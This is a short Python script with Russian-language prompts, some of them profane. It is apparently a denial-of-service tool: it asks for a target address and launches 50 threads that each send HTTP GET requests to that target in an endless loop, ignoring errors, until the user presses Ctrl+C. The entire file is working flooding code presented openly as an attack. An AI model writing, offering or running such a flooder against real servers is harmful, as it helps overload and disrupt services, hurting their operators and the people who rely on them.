import threading
import requests
import sys

def dos_target():
    target = input("введи айпи) ")
    print("иу атака нас хуй, остановка - Ctrl+C")
    threads = 50

    def flood():
        while True:
            try:
                requests.get(target, timeout=5)
            except:
                continue

    for _ in range(threads):
        threading.Thread(target=flood, daemon=True).start()

    try:
        while True: 
            pass
    except KeyboardInterrupt:
        print("\nАтака остановлена")

dos_target()
